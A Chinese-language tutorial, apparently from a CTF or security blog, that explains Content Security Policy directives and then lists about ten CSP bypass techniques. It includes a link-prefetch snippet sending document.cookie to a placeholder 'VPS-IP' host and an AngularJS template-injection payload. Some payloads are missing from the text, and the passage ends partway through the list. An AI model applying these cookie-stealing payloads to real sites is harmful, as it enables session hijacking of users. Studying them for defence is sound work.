  5. 策略还指定了违规报告的URL，任何不符合CSP策略的请求将被报告到`/csp-report`。
##### CSP中常见的策略指令
这些指令可以与特定的源（例如域名、协议、端口）一起使用，也可以使用通配符（*）来表示所有来源。
  1. `default-src`: 指定默认允许加载的资源类型和来源。
  2. `script-src`: 限制JavaScript脚本的来源。
  3. `style-src`: 限制CSS样式表的来源。
  4. `img-src`: 限制图片的来源。
  5. `connect-src`: 限制XMLHttpRequest和WebSocket的来源。
  6. `font-src`: 限制字体的来源。
  7. `object-src`: 限制object、embed、applet等插件的来源。
  8. `media-src`: 限制音频、视频等媒体资源的来源。
  9. `frame-src`: 限制iframe的来源。
  10. `child-src`: 限制子窗口的来源，包括iframe、web worker、embed等。
  11. `form-action`: 限制表单提交的目标地址。
  12. `sandbox`: 限制iframe中的脚本和插件的执行权限。
  13. `base-uri`: 限制base标签的目标地址。
  14. `report-uri`: 指定违规报告的URL。
##### CSP策略指令中常见的关键词
CSP策略指令包含一些关键词，这些关键词用于指定资源的类型和来源。
  1. `self`: 表示当前网站的源，也就是只允许从同一域名加载资源。
  2. `none`: 表示不允许加载任何资源。
  3. `unsafe-inline`: 表示允许内联脚本、样式表等，但存在安全风险。
  4. `unsafe-eval`: 表示允许使用`eval()`函数执行代码，但存在安全风险。
  5. `strict-dynamic`: 表示允许通过`nonce`或`hash`机制执行动态脚本，但不允许其他方式的动态脚本。
  6. `nonce-xxxx`: 表示允许执行指定的`nonce`值所对应的脚本，用于限制内联脚本的来源。
  7. `hash-xxxx`: 表示允许执行指定的哈希值所对应的脚本，用于限制外部脚本的来源。
  8. `data:`: 表示允许加载data URI格式的资源。
  9. `blob:`: 表示允许加载blob URL格式的资源。
  10. `mediastream:`: 表示允许加载mediastream格式的资源。
##### CSP策略指令中的存在安全风险数据类型
1.`data`:用于指定可以从`data URI`格式加载的资源。`data
URI`可以直接将资源的内容编码为字符串嵌入到URL中，而不需要从外部加载资源，因此会有一定的安全风险
**示例CSP策略**
    Content-Security-Policy: default-src 'self'; img-src 'self' data:;
在这个CSP策略中，限制默认加载的资源只能来自当前网站的源，图片的来源可以是来自当前网站的源，也可以是利用`data
uri`中加载，作为攻击者，可以利用`data uri`构造恶意脚本直接嵌入URL中，从而进行XSS攻击
2.`mediastream`:用于指定可以从哪些媒体流（例如摄像头或麦克风）加载资源。配合`media-src`策略指令使用，允许
mediastream: URI 作为内容来源。
**示例CSP策略**
    Content-Security-Policy: media-src mediastream:
这个CSP策略只允许从通过`getUserMedia()`方法获取的媒体流加载媒体资源，其他来源将被禁止。
3.`blob`:允许在HTML页面中使用Blob
URL，这是一种允许在浏览器中生成URL的API。当CSP策略允许任何来源使用blob数据类型时，会产生安全风险。
**示例CSP策略**
    Content-Security-Policy: default-src 'self'; img-src blob:
给出的示例CSP策略允许任何来源都可以使用blob数据类型来加载图像，这就给了攻击者注入恶意脚本的注入点。
4.`unsafe-inline`:允许在HTML页面中直接嵌入JavaScript代码。这是一种方便的方法，可以将脚本与页面混合在一起，但是也容易受到XSS攻击的威胁。
**示例CSP策略**
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
这个CSP策略只允许从当前网站加载默认资源，允许使用内联的JavaScript脚本，也就是说允许unsafe-inline，所以说攻击者可以直接利用漏洞执行XSS攻击
5.`unsafe-eval`:允许在HTML页面中使用eval函数来执行JavaScript代码。
**示例CSP策略**
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'
这个CSP策略允许在HTML页面中使用eval函数来执行JavaScript代码，即允许使用'unsafe-eval'。这可能导致数据注入攻击，因为攻击者可以通过注入特殊的参数来控制eval函数的执行结果，从而达到执行恶意代码的目的。
#### 绕过姿势
##### **1.利用iframe标签绕过CSP**
示例代码
        CSP
    CSP
        CSP
    CSP
这一段代码定义了2个php页面，在1.php中设置了CSP，
CSP策略
    Content-Security-Policy: default-src 'self';
但是在2.php中缺没有设置CSP，我们可以利用``的特性通过JavaScript，来进行操作1.php的DOM
这里分析一下payload，
我们可以创建一个``标签将其嵌入到DOM文档的body元素中，然后将``标签的src属性设置为'./1.php',从而使浏览器加载并渲染1.php页面的内容，我们的``标签也会嵌入到页面之中，之后利用了setTimeout()函数，等待了1000毫秒之后，可以向我们的VPS发送当前页面的cookie值，我们只需要在我们的VPS上监听设定的端口即可
##### 2.location绕过
这其实就是上面所说的unsafe-inline存在安全风险的利用
**示例CSP策略**
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
这里设定了script-src 'unsafe-inline';
所以我们可以利用location.href/window.location/window.open 绕过
exp:
    ?name=
##### 3.link标签绕过
适用于可以执行JavaScript脚本，但是无法将CSP数据带出
带出Cookie
    var link = document.createElement("link");
    link.setAttribute("rel", "prefetch");
    link.setAttribute("href", "//VPS-IP/?" + document.cookie);
    document.head.appendChild(link);
分析一下上面这一段代码，我们创建了一个``标签，之后利用setAttribute()方法设定了``标签的2个属性值，一个是rel属性，rel属性被设置为prefetch，就是让浏览器下载href属性指定的资源，这里还设定了href属性，href属性被设定为设置一个超链接，当被点击是，会以GET的形式请求我们的VPS，且带着用户自己的cookie值作为查询字符串附加在URL的末尾。
##### 4.低版本的CDN绕过
现在CDN新版本的框架安全性很好了，但是较早时候的一些框架存在一些安全风险，有CSP绕过的风险，这里就说明一下如何绕过低版本的CDN框架（前提是此CDN服务商在CSP白名单中）
orange师傅在之前一篇文章中有类似的案例[Hackmd XSS](https://paper.seebug.org/855/)
题目给出的CSP策略
这里可以看到通过script-src策略指令从cloudflare.com引用了CDN服务，这里orange师傅采用了低版本的angular
js模板注入来绕过CSP
        {{constructor.constructor('alert(document.cookie)')()}}
可以弹窗显示当前页面的cookie，说明我们的XSS攻击成功
除了上述的AngularJS库，还有一些可以绕过CSP的库
以Jquery-mobile库为例，如果题目给出的CSP策略中包含"script-src 'unsafe-eval'"或者"script-src
'strict-dynamic'"，那么下面的payload就可以绕过CSP：
##### 5.利用meta标签实现url跳转
当CSP策略中策略指令default-src 'none'的情况下，可以使用meta标签实现跳转
分析一下上面这一段代码是如何实现url跳转的，这里将meta标签的http-equiv的属性值设置为了'refresh'，也就是刷新，后面content属性设置了等待时间为3s，之后跳转到example.com。所以我们也可以利用这一种方式带出用户的Cookie值
##### 6.CRLF绕过
我知道如何利用CRLF漏洞进行XSS，但是利用CRLF漏洞进行绕过CSP这种题目我没有见过，学习了一下evoA师傅的思路
当一个页面存在CRLF漏洞时，且我们的可控点在CSP上方，就可以通过注入回车换行，将CSP挤到HTTP返回体中，这样就绕过了CSP
##### 7.站点可控静态资源绕过
**适用于站点存在可控静态资源，且站点在CSP白名单中**
这里给一个绕过codimd的(实例)[codimd
xss](https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md)
案例中codimd的CSP中使用了`www.google-analytics.com`
而且`www.google-analytics.com`中可以让我们自定义JavaScript，所以我们可以绕过CSP
##### 8.站点可控JSONP绕过
**适用于站点存在可控的JSONP，且站点在CSP白名单中**
大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析
以之前做过的bypasses-everywhere为例
题目给出的CSP策略
    Content-Security-Policy: script-src www.google.com; img-src *; default-src 'none'; style-src 'unsafe-inline'
这里看起来没有问题，但是script-src策略指令指定的google站点存在可控的JSONP  
利用下面payload测试一下
发现成功弹窗，之后我们可以利用注释符将其注释掉，从而实现任意js脚本
##### 9.Base-uri绕过
**适用于script-src只使用nonce，没有额外设置base-uri，页面引用存在相对路径的``标签**
当服务器CSP script-src采用了nonce时，如果只设置了default-src没有额外设置base-uri，就可以使用``标签使当前页面上下文为自己的vps，如果页面中的合法script标签采用了相对路径，那么最终加载的js就是针对base标签中指定url的相对路径。
    exp:
我们在自己服务器上创建一个2.js的脚本，可以将恶意脚本写入2.js中，从而当浏览器解析上述payload时，会访问我们的服务器上的创建的2.js恶意脚本，从而实现XSS
如果页面的script-src不是采用的nonce而是self或者域名ip，则不能使用此方法，因为VPS-IP不在CSP白名单内。
##### 10.不完整script标签绕过nonce
**适用于可控点在合法script标签上方,且其中没有其他标签，XSS页面的CSP script-src只采用了nonce方式**